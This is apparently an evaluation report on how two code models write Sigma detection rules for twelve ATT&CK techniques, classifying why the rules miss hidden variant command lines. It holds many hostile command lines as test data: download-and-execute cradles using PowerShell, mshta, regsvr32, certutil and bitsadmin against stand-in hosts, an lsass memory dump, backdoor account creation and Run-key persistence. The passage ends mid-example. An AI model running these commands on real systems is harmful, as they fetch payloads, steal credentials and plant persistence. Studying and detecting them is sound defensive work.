# Set 1 Failure Modes and Generalisation Analysis

## Section 1: Differences Between Shown Lines and Hidden Variants

For each of the 12 set 1 techniques, the attack was evaluated with a shown command line and a hidden variant line.

### T1059.001

- Program image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- Shown command line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
- Variant command line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
- Tokens only in shown line: `['-nop', '-w', 'hidden', '-c', 'http://10.0.0.5/a.ps1']`
- Tokens only in variant line: `['-ep', 'bypass', '-command', 'https://cdn.example.org/run.ps1']`
- Applicable differences: **extra or missing flags, values**

### T1218.011

- Program image: `C:\Windows\System32\rundll32.exe`
- Shown command line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
- Variant command line: `rundll32.exe D:\drivers\helper.sys,Start`
- Tokens only in shown line: `['C:\\Windows\\Temp\\driver.sys,Run']`
- Tokens only in variant line: `['D:\\drivers\\helper.sys,Start']`
- Applicable differences: **values**

### T1218.005

- Program image: `C:\Windows\System32\mshta.exe`
- Shown command line: `mshta.exe javascript:a=GetObject('script:http://10.0.0.5/x.sct').Exec();close()`
- Variant command line: `mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('calc.exe'))`
- Tokens only in shown line: `['javascript:a=GetObject(', 'script:http://10.0.0.5/x.sct', ').Exec();close()']`
- Tokens only in variant line: `['javascript:close(new', 'ActiveXObject(', 'WScript.Shell', ').Run(', 'calc.exe', '))']`
- Applicable differences: **values**

### T1218.010

- Program image: `C:\Windows\System32\regsvr32.exe`
- Shown command line: `regsvr32.exe /s /u /i:http://192.168.1.10/file.sct scrobj.dll`
- Variant command line: `regsvr32.exe /s /n /u /i:http://172.16.4.20/payload.sct scrobj.dll`
- Tokens only in shown line: `['/i:http://192.168.1.10/file.sct']`
- Tokens only in variant line: `['/n', '/i:http://172.16.4.20/payload.sct']`
- Applicable differences: **extra or missing flags, values**

### T1105

- Program image: `C:\Windows\System32\certutil.exe`
- Shown command line: `certutil.exe -urlcache -f http://10.0.0.5/payload.exe payload.exe`
- Variant command line: `certutil.exe -f -urlcache https://files.example.net/tool.exe C:\Users\Public\tool.exe`
- Tokens only in shown line: `['http://10.0.0.5/payload.exe', 'payload.exe']`
- Tokens only in variant line: `['https://files.example.net/tool.exe', 'C:\\Users\\Public\\tool.exe']`
- Applicable differences: **flag order, values**

### T1053.005

- Program image: `C:\Windows\System32\schtasks.exe`
- Shown command line: `schtasks.exe /create /tn Updater /tr C:\Users\student\AppData\Local\Temp\x.exe /sc once /st 12:00`
- Variant command line: `schtasks.exe /create /sc once /tn Cleanup /tr C:\Windows\Temp\run.bat /st 09:30`
- Tokens only in shown line: `['Updater', 'C:\\Users\\student\\AppData\\Local\\Temp\\x.exe', '12:00']`
- Tokens only in variant line: `['Cleanup', 'C:\\Windows\\Temp\\run.bat', '09:30']`
- Applicable differences: **flag order, values**

### T1547.001

- Program image: `C:\Windows\System32\reg.exe`
- Shown command line: `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe`
- Variant command line: `reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f`
- Tokens only in shown line: `['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'Updater', 'C:\\Users\\student\\x.exe']`
- Tokens only in variant line: `['HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce', 'Task', '/t', 'REG_SZ', 'C:\\Users\\Public\\m.exe', '/f']`
- Applicable differences: **extra or missing flags, values**

### T1136.001

- Program image: `C:\Windows\System32\net.exe`
- Variant program image: `C:\Windows\System32\net1.exe` (different program name)
- Shown command line: `net.exe user hacker P@ssw0rd123 /add`
- Variant command line: `net1.exe user svc_backup Winter2026! /add /domain`
- Tokens only in shown line: `['net.exe', 'hacker', 'P@ssw0rd123']`
- Tokens only in variant line: `['net1.exe', 'svc_backup', 'Winter2026!', '/domain']`
- Applicable differences: **different program name (variant_image), extra or missing flags, values**

### T1003.001

- Program image: `C:\Tools\procdump.exe`
- Variant program image: `C:\Tools\procdump64.exe` (different program name)
- Shown command line: `procdump.exe -ma lsass.exe lsass.dmp`
- Variant command line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
- Tokens only in shown line: `['procdump.exe', 'lsass.dmp']`
- Tokens only in variant line: `['procdump64.exe', '-accepteula', 'C:\\Temp\\l.dmp']`
- Applicable differences: **different program name (variant_image), extra or missing flags, values**

### T1197

- Program image: `C:\Windows\System32\bitsadmin.exe`
- Shown command line: `bitsadmin.exe /transfer job1 /download /priority high http://10.0.0.5/evil.dll C:\Users\student\evil.dll`
- Variant command line: `bitsadmin.exe /transfer j2 /download /priority normal https://files.example.net/p.ps1 C:\Users\Public\p.ps1`
- Tokens only in shown line: `['job1', 'high', 'http://10.0.0.5/evil.dll', 'C:\\Users\\student\\evil.dll']`
- Tokens only in variant line: `['j2', 'normal', 'https://files.example.net/p.ps1', 'C:\\Users\\Public\\p.ps1']`
- Applicable differences: **values**

### T1047

- Program image: `C:\Windows\System32\wbem\WMIC.exe`
- Shown command line: `wmic.exe process call create "cmd.exe /c calc.exe"`
- Variant command line: `wmic.exe /node:10.0.0.8 process call create "powershell.exe -enc AAAA"`
- Tokens only in shown line: `['cmd.exe', '/c', 'calc.exe']`
- Tokens only in variant line: `['/node:10.0.0.8', 'powershell.exe', '-enc', 'AAAA']`
- Applicable differences: **extra or missing flags, values**

### T1033

- Program image: `C:\Windows\System32\whoami.exe`
- Shown command line: `whoami.exe /priv`
- Variant command line: `whoami.exe -priv`
- Tokens only in shown line: `['/priv']`
- Tokens only in variant line: `['-priv']`
- Applicable differences: **flag prefix (- versus /)**

## Section 2: Failure Modes Classification

Every TOO_NARROW rule caught the shown attack line but failed the hidden variant line. Each blocking condition was tested alone using the validator SQLite conversion code and classified under the first matching class:

1. `ALIAS_IMAGE`: an Image or OriginalFileName condition fails on the variant because the executable name differs.
2. `VALUE`: the value contains an IPv4 address, a URL, a drive path, a filename with extension, >=3 digits, or a token unique to the shown line.
3. `FLAG_INCIDENTAL`: the value is a command-line flag present in the shown line but absent in the variant line.
4. `ADJACENT`: two or more words where every word exists in the variant line, but not adjacent in that specific sequence.
5. `PREFIX`: a flag whose prefix (- versus /) differs from the variant and the rule does not use windash.
6. `OTHER`: any other blocking condition.

### Prompt v3b (Run 20261111_1413, Temp 0.2, 3 Repeats)

#### qwen2.5-coder:7b under prompt v3b (13 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 3 | 3 | 23.1% |
| VALUE | 9 | 6 | 69.2% |
| FLAG_INCIDENTAL | 4 | 4 | 30.8% |
| ADJACENT | 0 | 0 | 0.0% |
| PREFIX | 0 | 0 | 0.0% |
| OTHER | 0 | 0 | 0.0% |

**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1218.011: 3, T1136.001: 3, T1197: 3, T1047: 1

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (1 examples shown):

- Example 1 (T1136.001):
  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
  - Blocking condition: `Image|endswith: \net.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\net.exe'
        CommandLine|contains|windash: '/add'
    condition: selection
```

**Class: VALUE** (3 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -w hidden`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c'
            - 'IEX'
            - 'DownloadString'
    condition: selection
```

- Example 2 (T1218.011):
  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
  - Blocking condition: `CommandLine|contains|all: C:\\Windows\\Temp\\driver.sys`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all:
            - 'C:\\Windows\\Temp\\driver.sys'
            - 'Run'
    condition: selection
```

- Example 3 (T1218.011):
  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
  - Blocking condition: `CommandLine|contains|all: C:\Windows\Temp\driver.sys`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all:
            - 'C:\Windows\Temp\driver.sys'
            - 'Run'
    condition: selection
```

**Class: FLAG_INCIDENTAL** (2 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -nop`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c'
            - 'IEX'
            - 'DownloadString'
    condition: selection
```

- Example 2 (T1047):
  - Shown line: `wmic.exe process call create "cmd.exe /c calc.exe"`
  - Variant line: `wmic.exe /node:10.0.0.8 process call create "powershell.exe -enc AAAA"`
  - Blocking condition: `CommandLine|contains|windash: /c`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\wmic.exe'
        CommandLine|contains|windash: '/c'
    condition: selection
```

#### qwen2.5-coder:14b under prompt v3b (9 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 6 | 6 | 66.7% |
| VALUE | 3 | 0 | 33.3% |
| FLAG_INCIDENTAL | 3 | 3 | 33.3% |
| ADJACENT | 3 | 0 | 33.3% |
| PREFIX | 0 | 0 | 0.0% |
| OTHER | 0 | 0 | 0.0% |

**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1136.001: 3, T1003.001: 3

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (2 examples shown):

- Example 1 (T1136.001):
  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
  - Blocking condition: `Image|endswith: \net.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\net.exe'
        CommandLine|contains|windash: '/add'
    condition: selection
```

- Example 2 (T1003.001):
  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
  - Blocking condition: `Image|endswith: \procdump.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\procdump.exe'
        CommandLine|contains|windash|all:
            - '-ma'
            - 'lsass.exe'
    condition: selection
```

**Class: VALUE** (1 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -w hidden`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c IEX'
    condition: selection
```

**Class: FLAG_INCIDENTAL** (1 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -nop`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c IEX'
    condition: selection
```

**Class: ADJACENT** (1 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -c IEX`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c IEX'
    condition: selection
```

### Prompt v3a (Run 20261111_1403, Temp 0.2, 3 Repeats)

#### qwen2.5-coder:7b under prompt v3a (20 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 6 | 6 | 30.0% |
| VALUE | 14 | 11 | 70.0% |
| FLAG_INCIDENTAL | 3 | 3 | 15.0% |
| ADJACENT | 0 | 0 | 0.0% |
| PREFIX | 0 | 0 | 0.0% |
| OTHER | 0 | 0 | 0.0% |

**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1218.011: 3, T1053.005: 3, T1547.001: 3, T1136.001: 3

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (2 examples shown):

- Example 1 (T1136.001):
  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
  - Blocking condition: `Image|endswith: \net.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\net.exe'
        CommandLine|contains|windash|all:
            - 'user'
            - '/add'
    condition: selection
```

- Example 2 (T1003.001):
  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
  - Blocking condition: `Image|endswith: \procdump.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\procdump.exe'
        CommandLine|contains|windash|all:
            - '-ma'
            - 'lsass.exe'
    condition: selection
```

**Class: VALUE** (3 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: hidden`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w'
            - 'hidden'
            - '-c'
            - 'IEX'
            - '(New-Object Net.WebClient).DownloadString'
    condition: selection
```

- Example 2 (T1218.011):
  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
  - Blocking condition: `CommandLine|contains|all: ,Run`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all:
            - ',Run'
    condition: selection
```

- Example 3 (T1218.011):
  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
  - Blocking condition: `CommandLine|contains|all: C:\\Windows\\Temp\\driver.sys`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all:
            - 'C:\\Windows\\Temp\\driver.sys'
            - ',Run'
    condition: selection
```

**Class: FLAG_INCIDENTAL** (2 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -nop`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w'
            - 'hidden'
            - '-c'
            - 'IEX'
            - '(New-Object Net.WebClient).DownloadString'
    condition: selection
```

- Example 2 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -w`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w'
            - 'hidden'
            - '-c'
            - 'IEX'
            - '(New-Object Net.WebClient).DownloadString'
    condition: selection
```

#### qwen2.5-coder:14b under prompt v3a (16 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 6 | 6 | 37.5% |
| VALUE | 10 | 7 | 62.5% |
| FLAG_INCIDENTAL | 3 | 3 | 18.8% |
| ADJACENT | 2 | 0 | 12.5% |
| PREFIX | 0 | 0 | 0.0% |
| OTHER | 0 | 0 | 0.0% |

**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1547.001: 3, T1136.001: 3, T1003.001: 3, T1197: 2

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (2 examples shown):

- Example 1 (T1136.001):
  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
  - Blocking condition: `Image|endswith: \net.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\net.exe'
        CommandLine|contains|windash|all:
            - 'user'
            - '/add'
    condition: selection
```

- Example 2 (T1003.001):
  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
  - Blocking condition: `Image|endswith: \procdump.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\procdump.exe'
        CommandLine|contains|windash|all:
            - '-ma'
            - 'lsass.exe'
    condition: selection
```

**Class: VALUE** (3 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -w hidden`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c IEX'
    condition: selection
```

- Example 2 (T1547.001):
  - Shown line: `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe`
  - Variant line: `reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f`
  - Blocking condition: `CommandLine|contains|windash|all: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\reg.exe'
        CommandLine|contains|windash|all:
            - 'add'
            - 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    condition: selection
```

- Example 3 (T1197):
  - Shown line: `bitsadmin.exe /transfer job1 /download /priority high http://10.0.0.5/evil.dll C:\Users\student\evil.dll`
  - Variant line: `bitsadmin.exe /transfer j2 /download /priority normal https://files.example.net/p.ps1 C:\Users\Public\p.ps1`
  - Blocking condition: `CommandLine|contains|windash|all: /priority high`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\bitsadmin.exe'
        CommandLine|contains|windash|all:
            - '/transfer'
            - '/download'
            - '/priority high'
    condition: selection
```

**Class: FLAG_INCIDENTAL** (1 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -nop`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c IEX'
    condition: selection
```

**Class: ADJACENT** (1 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -c IEX`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c IEX'
    condition: selection
```

### Prompt v2_1 (Frozen Candidates, Run 20261106_1344, Temp 0.2, 3 Repeats)

#### qwen2.5-coder:7b under prompt v2_1 (25 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 6 | 6 | 24.0% |
| VALUE | 18 | 16 | 72.0% |
| FLAG_INCIDENTAL | 3 | 3 | 12.0% |
| ADJACENT | 0 | 0 | 0.0% |
| PREFIX | 0 | 0 | 0.0% |
| OTHER | 0 | 0 | 0.0% |

**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1218.011: 3, T1218.005: 3, T1547.001: 3, T1136.001: 3

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (2 examples shown):

- Example 1 (T1136.001):
  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
  - Blocking condition: `Image|endswith: \net.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\net.exe'
        CommandLine|contains|windash|all:
            - 'user'
            - '/add'
    condition: selection
```

- Example 2 (T1003.001):
  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
  - Blocking condition: `Image|endswith: \procdump.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\procdump.exe'
        CommandLine|contains|windash|all:
            - 'lsass.exe'
            - '-ma'
    condition: selection
```

**Class: VALUE** (3 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -w hidden`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - 'IEX'
            - 'DownloadString'
            - 'http://'
    condition: selection
```

- Example 2 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: http://`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - 'IEX'
            - 'DownloadString'
            - 'http://'
    condition: selection
```

- Example 3 (T1218.011):
  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
  - Blocking condition: `CommandLine|contains|all: \Windows\Temp\`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all:
            - '\Windows\Temp\'
            - '.sys'
    condition: selection
```

**Class: FLAG_INCIDENTAL** (2 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -nop`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - 'IEX'
            - 'DownloadString'
            - 'http://'
    condition: selection
```

- Example 2 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -w`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w'
            - '-c'
            - 'IEX'
            - 'New-Object'
            - 'Net.WebClient'
            - 'DownloadString'
    condition: selection
```

#### qwen2.5-coder:14b under prompt v2_1 (28 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 6 | 6 | 21.4% |
| VALUE | 22 | 19 | 78.6% |
| FLAG_INCIDENTAL | 3 | 3 | 10.7% |
| ADJACENT | 2 | 0 | 7.1% |
| PREFIX | 0 | 0 | 0.0% |
| OTHER | 0 | 0 | 0.0% |

**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1218.011: 3, T1218.005: 3, T1547.001: 3, T1136.001: 3

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (2 examples shown):

- Example 1 (T1136.001):
  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
  - Blocking condition: `Image|endswith: \net.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\net.exe'
        CommandLine|contains|windash|all:
            - 'user'
            - '/add'
    condition: selection
```

- Example 2 (T1003.001):
  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
  - Blocking condition: `Image|endswith: \procdump.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\procdump.exe'
        CommandLine|contains|windash|all:
            - '-ma'
            - 'lsass.exe'
    condition: selection
```

**Class: VALUE** (3 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -w hidden`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c IEX (New-Object Net.WebClient).DownloadString'
    condition: selection
```

- Example 2 (T1218.011):
  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
  - Blocking condition: `CommandLine|contains|all: ,Run`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all:
            - '.sys'
            - ',Run'
    condition: selection
```

- Example 3 (T1218.005):
  - Shown line: `mshta.exe javascript:a=GetObject('script:http://10.0.0.5/x.sct').Exec();close()`
  - Variant line: `mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('calc.exe'))`
  - Blocking condition: `CommandLine|contains|all: GetObject`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\mshta.exe'
        CommandLine|contains|all:
            - 'javascript:'
            - 'GetObject'
            - 'Exec'
    condition: selection
```

**Class: FLAG_INCIDENTAL** (1 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -nop`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c IEX (New-Object Net.WebClient).DownloadString'
    condition: selection
```

**Class: ADJACENT** (1 examples shown):

- Example 1 (T1059.001):
